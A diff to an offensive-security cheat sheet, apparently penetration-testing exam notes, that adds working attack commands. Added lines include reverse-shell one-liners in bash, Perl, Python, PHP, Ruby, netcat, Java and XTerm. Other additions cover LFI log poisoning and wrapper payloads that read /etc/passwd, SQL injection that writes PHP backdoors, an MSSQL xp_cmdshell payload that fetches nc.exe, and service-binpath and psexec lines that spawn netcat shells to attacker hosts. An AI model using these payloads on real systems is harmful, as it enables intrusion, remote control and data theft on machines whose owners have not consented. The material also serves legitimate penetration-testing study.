@@ -101,6 +101,51 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 
 ## Gaining Access
 
+#### Reverse Shell One-Liners
+##### Bash
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+##### Perl
+```bash
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+##### URL-Encoded Perl: Linux
+```bash
+echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
+```
+
+##### Python
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+##### PHP
+```bash
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+##### Ruby
+```bash
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+##### Netcat without -e
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
+```
+
+##### Java
+```bash
+r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
+```
+##### XTerm
+```bash
+xterm -display 10.0.0.1:1
+```
+
+
+
 #### Uploading/POSTing Files Through WWW Upload Forms
 ```bash
 # POST file
@@ -153,20 +198,62 @@ gcc -m32|-m64 -o output source.c
 ```
 
 #### Local File Inclusion to Shell
-```php
-# Vulnerable web app on Windows + PHP through contaminated logs
-nc $WINDOWSTARGET 80
+```bash
+nc 192.168.1.102 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: 192.168.1.102
+Connection: close
 
-# Send as HTTP request
-<?php system($_GET['cmd']);?>
-
-# Send as cmd=
-powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
+# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
 ```
+
+
+#### Local File Inclusion: Reading Files
+```bash
+file:///etc/passwd
+php://input
+    send post data
+expect://whoami
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+# ZIP Wrapper
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;   
+mv payload.zip shell.jpg;    
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
+
+
 #### Remote File InclusionShell: Windows + PHP
 ```php
 <?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
 ```
+
+#### SQL Injection to Shell or Backdoor
+```sql
+# Assumed 3 columns
+http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
+
+```
+```bash
+# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
+sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
+```
+
+```bash
+# netcat reverse shell via mssql injection when xp_cmdshell is available
+1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
+```
+
+#### MS-SQL Console
+```bash
+mssqlclient.py -port 27900 user:password@10.1.1.1
+sqsh -S 10.1.1.1 -U user -P password
+```
+
 
 ## Local Enumeration & Privilege Escalation
 
@@ -222,10 +309,13 @@ echo binary>>ftp-commands.txt
 echo get file.exe>>ftp-commands.txt
 echo bye>>ftp-commands.txt 
 ftp -s:ftp-commands.txt
-```
-```bash
+
 # Or just a one-liner
 (echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
+```
+##### PHP
+```php
+<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
 ```
 
 ##### HTTP: Powershell
@@ -311,7 +401,7 @@ nc -nv -u -z -w 1 host 160-162
 #### Exploiting Vulnerable Windows Services: Weak Service Permissions
 ```
 # Look for SERVICE_ALL_ACCESS in the output
-accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 
 sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
 sc qc [service_name] (to verify!)
@@ -364,6 +454,12 @@ ssh localhost -p 8080
 # Requires PSRemoting
 $username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami } 
 ```
+##### CMD
+```bash
+# Requires interactive console
+runas /user:userName cmd.exe
+```
+
 ##### PsExec
 ```bash
 psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
@@ -386,7 +482,12 @@ which nc wget curl php perl python netcat tftp telnet ftp
 find /etc -iname *.conf
 ```
 
-## Maintaining Access
+## Post-Exploitation & Maintaining Access
+
+#### Decrypting VNC Password
+```bash
+wine vncpwdump.exe -k key
+```
 
 #### Creating User and Adding to Local Administrators
 ```bash
